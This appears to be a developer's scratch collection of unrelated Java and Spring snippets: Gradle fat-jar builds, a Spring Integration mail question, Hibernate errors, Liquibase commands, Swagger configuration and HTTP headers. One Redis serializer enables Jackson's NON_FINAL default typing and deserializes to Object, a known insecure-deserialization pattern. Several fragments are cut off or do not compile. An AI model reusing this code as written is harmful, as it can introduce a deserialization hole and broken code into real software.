}).collect(Collectors.toMap(data -> data[0], data -> data[1]));
--------------------------------------------------------------------------------------------------------
    /**
     * Provide a String representation of this validator.
     *
     * @return A String representation of this validator
     */
    @Override
    public String toString() {
        StringBuilder buffer = new StringBuilder();
        buffer.append("RegexValidator{");
        for (int i = 0; i < this.patterns.length; i++) {
            if (i > 0) {
                buffer.append(",");
            }
            buffer.append(this.patterns[i].pattern());
        }
        buffer.append("}");
        return buffer.toString();
    }
--------------------------------------------------------------------------------------------------------
PeriodFormat.space=\u0020
PeriodFormat.comma=,
PeriodFormat.commandand=,\u0438
PeriodFormat.commaspaceand=, \u0438
PeriodFormat.commaspace=,\u0020
PeriodFormat.spaceandspace=\ \u0438\u0020
PeriodFormat.regex.separator=%
PeriodFormat.years.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.years.list=\ \u0433\u043E\u0434%\ \u0433\u043E\u0434\u0430%\ \u043B\u0435\u0442
PeriodFormat.months.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.months.list=\ \u043C\u0435\u0441\u044F\u0446%\ \u043C\u0435\u0441\u044F\u0446\u0430%\ \u043C\u0435\u0441\u044F\u0446\u0435\u0432
PeriodFormat.weeks.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.weeks.list=\ \u043D\u0435\u0434\u0435\u043B\u044F%\ \u043D\u0435\u0434\u0435\u043B\u0438%\ \u043D\u0435\u0434\u0435\u043B\u044C
PeriodFormat.days.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.days.list=\ \u0434\u0435\u043D\u044C%\ \u0434\u043D\u044F%\ \u0434\u043D\u0435\u0439
PeriodFormat.hours.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.hours.list=\ \u0447\u0430\u0441%\ \u0447\u0430\u0441\u0430%\ \u0447\u0430\u0441\u043E\u0432
PeriodFormat.minutes.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.minutes.list=\ \u043C\u0438\u043D\u0443\u0442\u0430%\ \u043C\u0438\u043D\u0443\u0442\u044B%\ \u043C\u0438\u043D\u0443\u0442
PeriodFormat.seconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.seconds.list=\ \u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u0441\u0435\u043A\u0443\u043D\u0434
PeriodFormat.milliseconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.milliseconds.list=\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
 
repositories {
    mavenCentral()
}
 
dependencies {
    compile group: 'org.slf4j', name: 'slf4j-api', version: '1.7.25'
    compile group: 'org.slf4j', name: 'slf4j-simple', version: '1.7.25'
}

jar {
    manifest {
        attributes "Main-Class": "com.baeldung.fatjar.Application"
    }
 
    from {
        configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
    }
}

task customFatJar(type: Jar) {
    manifest {
        attributes 'Main-Class': 'com.baeldung.fatjar.Application'
    }
    baseName = 'all-in-one-jar'
    from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
    with jar
}

buildscript {
    repositories {
        jcenter()
    }
    dependencies {
        classpath 'com.github.jengelman.gradle.plugins:shadow:2.0.1'
    }
}
 
apply plugin: 'java'
apply plugin: 'com.github.johnrengelman.shadow'
--------------------------------------------------------------------------------------------------------
POST /test/servertest.jsp HTTP/1.1
Host: center:1001
Accept-Language: en,ru-ru;q=0.8,ru;q=0.5,en-us;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7
Content-Type: multipart/form-data; boundary=---------------------------265001916915724
Content-Length: 927
 
-----------------------------265001916915724
Content-Disposition: form-data; name="txt_1"
 
Гравитация
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="foto"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="btnsubmit"
 
Send
-----------------------------265001916915724--

IOUtils.toString(in, StandardCharsets.UTF_8);
IOUtils.toByteArray(is), charset
IOUtils.toString(mailInfo.getBody().getBytes(), StandardCharsets.US_ASCII.name);

IOUtils.toString(fileContent.getBytes("us-ascii"), "cp1251");

IOUtils.toString(fileContent.getBytes("utf-8"), "us-ascii");
--------------------------------------------------------------------------------------------------------


I am trying to add Spring Integration to a REST MVC Spring app I have been writing. I am using the latest Spring 4.2.x for core, integration and mvc. The idea is to create separate application contexts as on the Dynamic FTP example. The reason why is because I can send emails from 2 separated accounts as well as listen from 2 separated accounts hence having separate application contexts as well as environment variables to aid on bean creation for each context helps a bunch.

I apologize for the newbie questions, but I am having a hard time with the manual as well as trying to figure out how to setup SMTP email configuration class without XML.

I want to have both receive and send integration channels. All email settings will be configured from enviroment variables so I have injected the enviroment: @Autowired Environment env;

I can define:

    A MailSender bean
    A MailSendingMessageHandler bean
    A MessageChannel for the SMTP (outbound)

Now, on XML configurations you have an outbound-channel-adapter where you wire the mail-sender bean as well as the MessageChannel

My goal is to have configurations for:

    Send emails.
    Listen to IMAP emails and process them.

For sending emails, the idea is to get from a rest endpoint, calling a service and that service is what will put a message to Integration SMTP outbound channel to send an email. Looks like, by using the MailSendingMessageHandler it will get the Integration Message and convert to a Mail Message for the MailSender. I have no idea on how to wire the MailSendingMessageHandler to the outbound channel so that an email can be send. Also I do not know how to, from my @Service class that is called by the rest endpoint how to create the messages and send them through the outbound SMTP channel so emails can be send. On one rest call I send all email recipients I want to reach. Before, each email message body is properly formatted so that I can create each Integration Message (as an email) that will be handled and converted by MailSendingMessageHandler. I have tried to find examples online without success on how to accomplish this.

Any examples you could redirect me? Thanks in advance!

So far I have for the configuration:

import java.util.Properties;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.integration.annotation.InboundChannelAdapter;
import org.springframework.integration.config.EnableIntegration;
import org.springframework.integration.annotation.Poller;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.integration.channel.QueueChannel;
import org.springframework.integration.core.MessageSource;
import org.springframework.integration.mail.MailReceiver;
import org.springframework.integration.mail.MailReceivingMessageSource;
import org.springframework.integration.mail.MailSendingMessageHandler;
import org.springframework.mail.MailMessage;
import org.springframework.mail.MailSender;
import org.springframework.mail.javamail.JavaMailSenderImpl;
import org.springframework.messaging.MessageChannel;
import org.springframework.messaging.MessagingException;


import org.springframework.core.env.Environment;

@Configuration
@EnableIntegration
public class IntegrationEmailConfig {

@Autowired 
Environment env;

@Bean
public static PropertySourcesPlaceholderConfigurer pspc() {
    return new PropertySourcesPlaceholderConfigurer();
}

@Bean
@InboundChannelAdapter(value = "emailInboundChannel", poller = @Poller(fixedDelay = "5000") )
public MailReceivingMessageSource mailMessageSource(MailReceiver imapMailReceiver) {
    return new MailReceivingMessageSource(imapMailReceiver);
}

private Properties additionalMailProperties() { 
    Properties properties = new Properties();
    if (env.containsProperty("mail.smtp.auth")) {
        properties.setProperty("mail.smtp.auth",env.getProperty("mail.smtp.auth"));
    }
    if (env.containsProperty("mail.smtp.starttls.enable")) {
        properties.setProperty("mail.smtp.starttls.enable",env.getProperty("mail.smtp.starttls.enable"));
    }
    return properties; 
} 


@Bean
public MailSender mailSender() throws Exception {
    JavaMailSenderImpl mailSender = new JavaMailSenderImpl();
    if (env.containsProperty("mail.server.host")) {
        mailSender.setHost(env.getProperty("mail.server.host"));
    } else {
        throw new Exception("Missing mail.server.host property");
    }
    if (env.containsProperty("mail.server.port")) {
        mailSender.setPort(Integer.parseInt(env.getProperty("mail.server.port")));
    } else {
        throw new Exception("Missing mail.server.port property");
    }
    if (env.containsProperty("mail.server.username")) {
        mailSender.setUsername(env.getProperty("mail.server.username"));
    } else {
        throw new Exception("Missing mail.server.username property");
    }
    if (env.containsProperty("mail.server.password")) {
        mailSender.setPassword(env.getProperty("mail.server.password"));
    } else {
        throw new Exception("Missing mail.server.password property");
    }
    mailSender.setJavaMailProperties(additionalMailProperties());
    return mailSender;
}

@Bean
public MailSendingMessageHandler mailSendingMessageHandler() throws Exception {
    MailSendingMessageHandler mailSendingMessageHandler = new MailSendingMessageHandler(mailSender());
    //mailSendingMessageHandler.setChannelResolver(channelResolver);
    return mailSendingMessageHandler;
}

/*    @Bean
public DirectChannel outboundMail() {
    DirectChannel outboundChannel = new DirectChannel();
    return outboundChannel;
}
*/    
@Bean
public MessageChannel smtpChannel() {
    return new DirectChannel();
}


/*    @Bean
@Value("${imap.url}")
public MailReceiver imapMailReceiver(String imapUrl) {
//      ImapMailReceiver imapMailReceiver = new ImapMailReceiver(imapUrl);
//      imapMailReceiver.setShouldMarkMessagesAsRead(true);
//      imapMailReceiver.setShouldDeleteMessages(false);
//      // other setters here
//      return imapMailReceiver;
    MailReceiver receiver = mock(MailReceiver.class);
    MailMessage message = mock(Message.class);
    when(message.toString()).thenReturn("Message from " + imapUrl);
    Message[] messages = new Message[] {message};
    try {
        when(receiver.receive()).thenReturn(messages);
    }
    catch (MessagingException e) {
        e.printStackTrace();
    }
    return receiver;
}*/
--------------------------------------------------------------------------------------------------------
o.e.i.i.r.RobustResilienceStrategy       : Ehcache key com.paragon.microservices.distributor.model.entity.LocaleVersionEntity#LocaleVersionEntity.LocaleVersionID(locale=LocaleEntity(super=BaseAudiEntity(super=AuditEntity(createdDate=2019-08-26T12:39:16Z, createdBy=AuthenticatedUser(userId=ee9cb324-1781-4bb6-6131-08d727c2cbb2, ownerId=b3a341c7-43d0-41b9-af35-cb4cf3b13476), lastModifiedDate=null, lastModifiedBy=null), id=8c7eb5e1-c302-472f-9206-b9d7d01ad257, rowVersion=0), localeName=ru), version=VersionEntity(super=BaseAudiEntity(super=AuditEntity(createdDate=2019-08-26T12:39:16Z, createdBy=AuthenticatedUser(userId=ee9cb324-1781-4bb6-6131-08d727c2cbb2, ownerId=b3a341c7-43d0-41b9-af35-cb4cf3b13476), lastModifiedDate=null, lastModifiedBy=null), id=c4dfe4f0-bda1-4e3d-ae20-b184a545a408, rowVersion=0), product=ProductEntity(super=BaseAudiEntity(super=AuditEntity(createdDate=2019-08-26T12:39:16Z, createdBy=AuthenticatedUser(userId=ee9cb324-1781-4bb6-6131-08d727c2cbb2, ownerId=b3a341c7-43d0-41b9-af35-cb4cf3b13476), lastModifiedDate=null, lastModifiedBy=null), id=b7d41c8c-3072-486f-a640-1ae183e77fbb, rowVersion=0), sku=sku-b7d41c8c, name=product-01), versionInfo=VersionInfoEntity(tokens=[9, 6, 7, 4]), changelog=changelog-c4dfe4f0)) in possible inconsistent state - Similar messages will be suppressed for 30 seconds
--------------------------------------------------------------------------------------------------------
https://www.jdoodle.com/online-java-compiler/
--------------------------------------------------------------------------------------------------------
org.hibernate.HibernateException: A collection with cascade="all-delete-orphan" was no longer referenced by the owning entity instance: com.paragon.microservices.distributor.model.entity.VersionEntity.locales

        <dependency>
            <groupId>org.hibernate.orm</groupId>
            <artifactId>hibernate-hikaricp</artifactId>
            <version>6.0.0.Alpha2</version>
        </dependency>
--------------------------------------------------------------------------------------------------------
    /**
     * Parses the given {@link String} representation to {@link Iterable} collection of {@link VersionInfoEntity}s
     *
     * @param value  - initial input {@link String} value to parse, must not be {@literal null} or empty
     * @param locale - initial input {@link Locale}
     * @return {@link Iterable} collection of {@link VersionInfoEntity}s
     */
    @Override
    public Set<LocaleVersionEntity> parse(final String value, final Locale locale) throws ParseException {
        ValidationUtils.checkNotEmpty(value, "Locale must not be null or empty!");

        try {
            return Optional.ofNullable(this.conversionService.convert(value, Set.class))
                    .map(v -> (Set<String>) v)
                    .map(this.localeService::getLocaleRecordsByNames)
                    .map(this::getLocaleVersions)
                    .orElse(null);
        } catch (IllegalArgumentException ex) {
            log.error("ERROR: cannot process input source = {}, message = {}", value, ex.getMessage());
            throw new ParseException(String.format(LOCALE_PARSE_ERROR, value, ex.getMessage()), 0);
        }
    }
--------------------------------------------------------------------------------------------------------
integer ARRAY
integer[]

	@Bean
	public ErrorPageCustomizer errorPageCustomizer() {
		return new ErrorPageCustomizer(this.serverProperties, this.dispatcherServletPath);
	}
	ErrorMvcAutoConfiguration
HTTP 1/1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 2016-10-12T11:00:00Z

POST https://domainname/oauth/token  
Authorization: Basic Y2xpZW50X2lkOmNsaWVudCBzZWNyZXQ=
Content-Type: application/x-www-form-urlencoded
username=user&password=pass&scope=eBanking&grant_type=password
--------------------------------------------------------------------------------------------------------
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=website.war \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger \
      update
	  
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        updateSQL > /tmp/script.sql

java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        listLocks
		
java -jar liquibase.jar --changeLogFile="./data/<insert file name> " --diffTypes="data" generateChangeLog
liquibase.bat update -Dengine=myisam
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Primary;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisOperations;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;
import org.springframework.data.redis.serializer.StringRedisSerializer;

import com.fasterxml.jackson.annotation.JsonTypeInfo.As;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;

@SpringBootApplication
public class App {

	@Bean
	@Primary
	RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory rcf) {
		RedisTemplate<String, Object> template = new RedisTemplate<>();
		template.setConnectionFactory(rcf);
		template.setKeySerializer(new StringRedisSerializer());
		template.setValueSerializer(new JsonRedisSerializer());
		return template;
	}

	static class JsonRedisSerializer implements RedisSerializer<Object> {

		private final ObjectMapper om;

		public JsonRedisSerializer() {
			this.om = new ObjectMapper().enableDefaultTyping(DefaultTyping.NON_FINAL, As.PROPERTY);
		}

		@Override
		public byte[] serialize(Object t) throws SerializationException {
			try {
				return om.writeValueAsBytes(t);
			} catch (JsonProcessingException e) {
				throw new SerializationException(e.getMessage(), e);
			}
		}

		@Override
		public Object deserialize(byte[] bytes) throws SerializationException {
			if(bytes == null){
				return null;
			}
			
			try {
				return om.readValue(bytes, Object.class);
			} catch (Exception e) {
				throw new SerializationException(e.getMessage(), e);
			}
		}
	}

	public static void main(String[] args) {

		RedisOperations<String, Object> redis = SpringApplication.run(App.class, args).getBean(RedisOperations.class);
		
		A a = new B();
		System.out.println(a);
		redis.opsForValue().set("foo", a);
		
		A aa = (A)redis.opsForValue().get("foo");
		System.out.println(aa);
		
	}

	public static class A implements Serializable{
		
		long longProperty = System.currentTimeMillis();
		String stringProperty = "foo";

		public String getStringProperty() {
			return stringProperty;
		}

		public void setStringProperty(String stringProperty) {
			this.stringProperty = stringProperty;
		}

		@Override
		public String toString() {
			return "A [stringProperty=" + stringProperty + "]";
		}
	}

	public static class B extends A {

		int intProperty = 42;

		public int getIntProperty() {
			return intProperty;
		}

		public void setIntProperty(int intProperty) {
			this.intProperty = intProperty;
		}

		@Override
		public String toString() {
			return "B [intProperty=" + intProperty + ", stringProperty=" + stringProperty + "]";
		}
	}
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.system.configuration;

import com.paragon.microservices.distributor.model.domain.AuthenticatedUser;
import com.paragon.microservices.distributor.system.property.SwaggerProperty;
import io.swagger.annotations.ApiOperation;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.data.domain.Pageable;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.ParameterBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.schema.ModelRef;
import springfox.documentation.service.*;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.service.contexts.SecurityContext;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

import java.time.Instant;
import java.util.Collections;
import java.util.List;
import java.util.Optional;

import static com.google.common.collect.Lists.newArrayList;
import static com.google.common.collect.Sets.newHashSet;

@Configuration
@EnableSwagger2
@Description("Paragon MicroServices Distributor Swagger configuration")
@RequiredArgsConstructor
public class SwaggerConfiguration {

    /**
     * Default {@link Docket} resource tags
     */
    public static final String ADMIN_PRODUCT_RESOURCE_TAG = "Admin Product REST API Endpoint";
    public static final String CLIENT_PRODUCT_RESOURCE_TAG = "Client Product REST API Endpoint";
    public static final String DOWNLOAD_RESOURCE_TAG = "Download REST API Endpoint";

    private final SwaggerProperty swaggerProperty;

    @Bean
    @Description("Swagger docket API configuration bean")
    public Docket api() {
        return new Docket(DocumentationType.SWAGGER_2)
                .enable(this.swaggerProperty.isEnabled())
                .ignoredParameterTypes(AuthenticatedUser.class, Pageable.class)
                .select()
                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
                .paths(PathSelectors.ant("/api/**"))
                .build()
                //.pathMapping("/api")
                .apiInfo(this.apiInfo())
                .directModelSubstitute(Instant.class, String.class)
                .directModelSubstitute(java.sql.Timestamp.class, java.sql.Date.class)
                .genericModelSubstitutes(ResponseEntity.class, Optional.class)
                .securitySchemes(newArrayList(this.securityScheme()))
                .securityContexts(newArrayList(this.securityContext()))
                .globalOperationParameters(newArrayList(this.getHeaderParameter()))
                //.host(this.swaggerProperty.getHost())
                .forCodeGeneration(this.swaggerProperty.isForCodeGeneration())
                .enableUrlTemplating(this.swaggerProperty.isEnableUrlTemplating())
                .useDefaultResponseMessages(this.swaggerProperty.isUseDefaultResponseMessages())
                .protocols(newHashSet(this.swaggerProperty.getProtocols()))
                .consumes(newHashSet(MediaType.APPLICATION_JSON_UTF8_VALUE))
                .produces(newHashSet(MediaType.APPLICATION_JSON_UTF8_VALUE, MediaType.APPLICATION_OCTET_STREAM_VALUE))
                .tags(
                        new Tag(this.swaggerProperty.getTags().getAdminProductEndpoint().getName(), this.swaggerProperty.getTags().getAdminProductEndpoint().getDescription()),
                        new Tag(this.swaggerProperty.getTags().getClientProductEndpoint().getName(), this.swaggerProperty.getTags().getClientProductEndpoint().getDescription()),
                        new Tag(this.swaggerProperty.getTags().getDownloadEndpoint().getName(), this.swaggerProperty.getTags().getDownloadEndpoint().getDescription())
                );
    }

//    @Bean
//    @Description("Swagger docket UI configuration bean")
//    public UiConfiguration uiConfig() {
//        return UiConfigurationBuilder.builder()
//                .deepLinking(this.swaggerProperty.isDeepLinking())
//                .displayOperationId(this.swaggerProperty.isDisplayOperationId())
//                .defaultModelsExpandDepth(this.swaggerProperty.getDefaultModelsExpandDepth())
//                .defaultModelExpandDepth(this.swaggerProperty.getDefaultModelExpandDepth())
//                .defaultModelRendering(ModelRendering.EXAMPLE)
//                .displayRequestDuration(this.swaggerProperty.isDisplayRequestDuration())
//                .docExpansion(DocExpansion.NONE)
//                .filter(this.swaggerProperty.isFilter())
//                .maxDisplayedTags(this.swaggerProperty.getMaxDisplayedTags())
//                .operationsSorter(OperationsSorter.ALPHA)
//                .showExtensions(this.swaggerProperty.isShowExtensions())
//                .tagsSorter(TagsSorter.ALPHA)
//                .supportedSubmitMethods(this.swaggerProperty.getSupportedSubmitMethods().toArray(new String[0]))
//                .validatorUrl(null)
//                .build();
//    }

//    private Type pageableMixin() {
//        return new AlternateTypeBuilder()
//                .fullyQualifiedClassName(
//                        String.format("%s.generated.%s",
//                                Pageable.class.getPackage().getName(),
//                                Pageable.class.getSimpleName()))
//                .withProperties(Arrays.asList(
//                        property(Integer.class, "page"),
//                        property(Integer.class, "limit"),
//                        property(String.class, "sort")
//                ))
//                .build();
//    }
//
//    private AlternateTypePropertyBuilder property(final Class<?> type, final String name) {
//        return new AlternateTypePropertyBuilder()
//                .withName(name)
//                .withType(type)
//                .withCanRead(true)
//                .withCanWrite(true);
//    }

    private Parameter getHeaderParameter() {
        return new ParameterBuilder()
                .name("Authorization")
                .description("Authorization bearer header")
                .modelRef(new ModelRef("string"))
                .parameterType("header")
                .required(true)
                .build();
    }

    private SecurityScheme securityScheme() {
        return new ApiKey("Bearer", "Authorization", "Header");
    }

    private SecurityContext securityContext() {
        return SecurityContext.builder()
                .securityReferences(this.defaultAuth())
                .forPaths(PathSelectors.ant("/api/**"))
                .build();
    }

    private AuthorizationScope[] authorizationScopes() {
        return new AuthorizationScope[]{
                new AuthorizationScope("write:models", "modify products/versions/binaries models"),
                new AuthorizationScope("read:models", "read products/versions/binaries models"),
                new AuthorizationScope("read:product-models", "read products models"),
                new AuthorizationScope("read:file-models", "read file models")
        };
    }

    private List<SecurityReference> defaultAuth() {
        return Collections.singletonList(new SecurityReference("Bearer", this.authorizationScopes()));
    }

    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                .title(this.swaggerProperty.getTitle())
                .description(this.swaggerProperty.getDescription())
                .termsOfServiceUrl(this.swaggerProperty.getTermsOfServiceUrl())
                .contact(new Contact(
                        this.swaggerProperty.getContact().getName(),
                        this.swaggerProperty.getContact().getUrl(),
                        this.swaggerProperty.getContact().getEmail()
                ))
                .license(this.swaggerProperty.getLicense())
                .licenseUrl(this.swaggerProperty.getLicenseUrl())
                .version(this.swaggerProperty.getVersion())
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
@Query(nativeQuery=true, value="SELECT * FROM table WHERE project = ?1 AND (summary regexp ?2 OR description regexp ?2)")
List<Issue> findByProjectAndSummaryOrDescription(long 

List<Issue> findByProjectAndDescriptionRegex(long project, String regex);

List<Issue> findByProjectAndSummaryRegexOrDescriptionRegex(long project, String regex, String regex);
--------------------------------------------------------------------------------------------------------
import javax.servlet.ServletContext;
import javax.servlet.ServletException;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.web.context.request.RequestContextListener;

/**
 * Main Application Class - uses Spring Boot. Just run this as a normal Java
 * class to run up a Jetty Server (on http://localhost:8082/spring-rest-query-language)
 *
 */
@EnableScheduling
@EnableAutoConfiguration
@ComponentScan("com.baeldung")
@SpringBootApplication
public class Application extends SpringBootServletInitializer {

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(Application.class);
    }

    @Override
    public void onStartup(ServletContext sc) throws ServletException {
        // Manages the lifecycle of the root application context
        sc.addListener(new RequestContextListener());
    }

    public static void main(final String[] args) {
        SpringApplication.run(Application.class, args);
    }
}
--------------------------------------------------------------------------------------------------------

import javax.persistence.metamodel.SingularAttribute;
import javax.persistence.metamodel.StaticMetamodel;

@StaticMetamodel(User.class)
public class User_ {
    public static volatile SingularAttribute<User, Long> id;
    public static volatile SingularAttribute<User, String> firstName;
    public static volatile SingularAttribute<User, String> lastName;
    public static volatile SingularAttribute<User, Integer> age;
    public static volatile SingularAttribute<User, String> email;
}
--------------------------------------------------------------------------------------------------------
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-store, must-revalidate, no-transform

Pragma: no-cache
X-Total-Elements: 11
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-store, must-revalidate, no-transform
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
vary: accept-encoding
Content-Type: application/json
Transfer-Encoding: chunked
Date: Wed, 11 Sep 2019 13:08:10 GMT
X-Content-Encoding-Over-Network: gzip
 
 
content-type: application/json;charset=UTF-8 
date: Wed, 11 Sep 2019 13:10:51 GMT 
Transfer-Encoding: chunked
vary: accept-encoding 
X-Content-Encoding-Over-Network: gzip
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
--------------------------------------------------------------------------------------------------------
@ApiImplicitParams({
    @ApiImplicitParam(name = "name", value = "User's name", required = true, dataType = "string", paramType = "query"),
    @ApiImplicitParam(name = "email", value = "User's email", required = false, dataType = "string", paramType = "query"),
    @ApiImplicitParam(name = "id", value = "User ID", required = true, dataType = "long", paramType = "query")
  })
 public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {...}
--------------------------------------------------------------------------------------------------------
 "parameters": [
  {
    "name": "name",
    "description": "User's name",
    "required": true,
    "type": "string",
    "in": "query"
  },
  {
    "name": "email",
    "description": "User's email",
    "required": false,
    "type": "string",
    "in": "query"
  },
  {
    "name": "id",
    "description": "User ID",
    "required": true,
    "type": "integer",
    "format": "int64",
    "in": "query"
  }
]
--------------------------------------------------------------------------------------------------------
extensions = {
       @Extension(properties = {
           @ExtensionProperty(name = "test1", value = "value1"),
           @ExtensionProperty(name = "test2", value = "value2")
       })
    }
	
public class BasePathModifier implements ReaderListener {
    void beforeScan(Reader reader, Swagger swagger){}

    void afterScan(Reader reader, Swagger swagger){
        swagger.setBasePath( System.getProperty( "swagger.basepath", swagger.getBasePath() ));
    }
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<profiles version="12">
<profile kind="CodeFormatterProfile" name="bitpipeline" version="12">
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_ellipsis" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_enum_declarations" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_annotation_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_allocation_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_at_in_annotation_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.new_lines_at_block_boundaries" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_constructor_declaration_parameters" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.insert_new_line_for_parameter" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_package" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_parens_in_enum_constant" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_after_imports" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_while" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.insert_new_line_before_root_tags" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_parens_in_annotation_type_member_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_method_declaration_throws" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_javadoc_comments" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.indentation.size" value="4"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_postfix_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_for_increments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_type_arguments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_for_inits" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_anonymous_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_semicolon_in_for" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.disabling_tag" value="@formatter:off"/>
<setting id="org.eclipse.jdt.core.formatter.continuation_indentation" value="2"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_enum_constants" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_imports" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_after_package" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_binary_operator" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_multiple_local_declarations" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_enum_constant" value="0"/>
